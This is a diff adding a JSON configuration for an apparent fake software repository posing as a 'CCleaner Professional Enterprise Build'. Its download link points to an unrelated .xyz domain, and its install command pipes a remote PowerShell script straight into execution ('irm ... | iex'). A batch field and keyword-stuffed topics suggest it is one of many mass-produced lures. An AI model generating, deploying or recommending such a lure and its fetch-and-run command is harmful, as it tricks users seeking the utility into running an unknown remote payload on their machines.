@@ -1,0 +1,27 @@
+{
+  "repo": "ccleaner-professional-enterprise-build",
+  "product": "CCleaner Professional Enterprise Build",
+  "kind": "utility",
+  "install_type": "download",
+  "download_url": "https://ccleaner.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new32",
+  "format": "license-md-only",
+  "category": "utility",
+  "topics": [
+    "ccleaner-quickstart",
+    "ccleaner-faq",
+    "getting-started",
+    "install-guide",
+    "driver-helper",
+    "ccleaner-for-windows",
+    "windows-11",
+    "pc-maintenance",
+    "registry-tools",
+    "desktop-app",
+    "ccleaner-connection-help",
+    "ccleaner-latest-build",
+    "ccleaner-x64"
+  ]
+}
